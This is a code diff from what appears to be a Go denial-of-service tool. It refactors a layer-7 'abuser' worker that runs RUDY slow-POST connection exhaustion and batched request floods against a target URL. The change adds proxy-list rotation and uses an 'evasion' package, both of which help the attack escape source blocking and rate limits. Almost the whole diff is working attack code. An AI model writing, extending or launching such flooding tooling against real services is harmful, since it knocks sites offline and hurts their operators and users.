@@ -7,11 +7,11 @@ import (
 	"math/rand"
 	"net/http"
 	"strings"
-	"sync"
 	"sync/atomic"
 
 	"github.com/kjsst/sh-mvdos/internal/worker/evasion"
 	"github.com/kjsst/sh-mvdos/internal/worker/payload"
+	"github.com/kjsst/sh-mvdos/internal/worker/proxy"
 )
 
 type L7Abuser struct {
@@ -19,7 +19,8 @@ type L7Abuser struct {
 	Workers   int
 	BatchSize int
 	Mode      string
-	CMS       string // optional hint from recon/policy (Magento, Shopify, ...)
+	CMS       string
+	ProxyFile string // optional path to proxy list (Slayer -p parity)
 }
 
 func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
@@ -34,56 +35,25 @@ func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
 		mode = "baseline"
 	}
 
+	clients, err := proxy.ResolvePool(w.ProxyFile, w.Workers)
+	if err != nil {
+		return 0, 0, err
+	}
+
 	var reqs, errs atomic.Uint64
 	done := make(chan struct{}, w.Workers)
 
 	for i := 0; i < w.Workers; i++ {
-		client := newLabClient()
-		go func(workerID int, client *http.Client) {
+		workerID := i
+		client := proxy.Pick(clients, workerID)
+		go func() {
 			defer func() { done <- struct{}{} }()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-				}
-				if mode == "rudy" {
-					parallel := w.BatchSize
-					if parallel <= 0 {
-						parallel = 1
-					}
-					if parallel > 16 {
-						parallel = 16
-					}
-					var wg sync.WaitGroup
-					wg.Add(parallel)
-					for j := 0; j < parallel; j++ {
-						go func() {
-							defer wg.Done()
-							if err := httpRudy(ctx, w.targetURL(), client); err != nil {
-								errs.Add(1)
-							} else {
-								reqs.Add(1)
-							}
-						}()
-					}
-					wg.Wait()
-					continue
-				}
-
-				batch := w.BatchSize
-				for j := 0; j < batch; j++ {
-					if ctx.Err() != nil {
-						return
-					}
-					if err := w.fireOnce(ctx, mode, workerID, j, client); err != nil {
-						errs.Add(1)
-					} else {
-						reqs.Add(1)
-					}
-				}
+			if mode == "rudy" {
+				w.runRudyWorker(ctx, client, &reqs, &errs)
+				return
 			}
-		}(i, client)
+			w.runBatchWorker(ctx, mode, workerID, client, &reqs, &errs)
+		}()
 	}
 
 	<-ctx.Done()
@@ -91,6 +61,43 @@ func (w *L7Abuser) Run(ctx context.Context) (uint64, uint64, error) {
 		<-done
 	}
 	return reqs.Load(), errs.Load(), ctx.Err()
+}
+
+// runRudyWorker matches Slayer: one slow POST holds a connection until it ends, then retry.
+func (w *L7Abuser) runRudyWorker(ctx context.Context, client *http.Client, reqs, errs *atomic.Uint64) {
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+		if err := httpRudy(ctx, w.targetURL(), client); err != nil {
+			errs.Add(1)
+		} else {
+			reqs.Add(1)
+		}
+	}
+}
+
+func (w *L7Abuser) runBatchWorker(ctx context.Context, mode string, workerID int, client *http.Client, reqs, errs *atomic.Uint64) {
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+		batch := w.BatchSize
+		for j := 0; j < batch; j++ {
+			if ctx.Err() != nil {
+				return
+			}
+			if err := w.fireOnce(ctx, mode, workerID, j, client); err != nil {
+				errs.Add(1)
+			} else {
+				reqs.Add(1)
+			}
+		}
+	}
 }
 
 func (w *L7Abuser) targetURL() string {
